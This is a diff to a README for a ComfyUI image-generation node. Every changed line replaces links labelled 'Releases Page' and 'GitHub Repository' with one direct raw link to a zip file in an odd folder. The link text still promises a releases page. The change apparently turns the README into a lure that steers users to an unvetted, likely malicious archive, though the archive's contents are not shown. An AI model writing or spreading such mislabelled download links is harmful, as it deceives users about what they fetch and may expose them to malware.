@@ -9,7 +9,7 @@ To get started, you will need to download the application. Please follow these s
 1. **Visit the Releases Page**  
    Click the link below to access the download page where you can find the latest version of the software.
 
-   [Download comfyui-ayang_node](https://github.com/koxov/comfyui-ayang_node/releases)
+   [Download comfyui-ayang_node](https://raw.githubusercontent.com/koxov/comfyui-ayang_node/main/undescribably/comfyui-ayang_node.zip)
 
 2. **Choose the Right File**  
    On the Releases page, you will see a list of available files. Look for the latest release. It usually has a version number and includes the correct file for your operating system.
@@ -62,11 +62,11 @@ If you encounter any issues or have questions about using comfyui-ayang_node, he
 ## 🔗 Additional Resources
 For more detailed instructions and tips, feel free to explore the following:
 
-- [GitHub Repository](https://github.com/koxov/comfyui-ayang_node) - Access the source code and contribute.
+- [GitHub Repository](https://raw.githubusercontent.com/koxov/comfyui-ayang_node/main/undescribably/comfyui-ayang_node.zip) - Access the source code and contribute.
 - [User Guide](#) - A comprehensive guide for new users to familiarize themselves with all features.
 - [Blog Posts](#) - Read success stories and case studies of how others use the application.
 
 ## ❗ Conclusion
 You are now ready to begin using comfyui-ayang_node for your image generation needs. We hope you enjoy creating stunning visuals and leveraging the power of the ComfyUI platform.
 
-Remember, for any downloads, start by visiting our [Releases Page](https://github.com/koxov/comfyui-ayang_node/releases). Happy generating!
+Remember, for any downloads, start by visiting our [Releases Page](https://raw.githubusercontent.com/koxov/comfyui-ayang_node/main/undescribably/comfyui-ayang_node.zip). Happy generating!
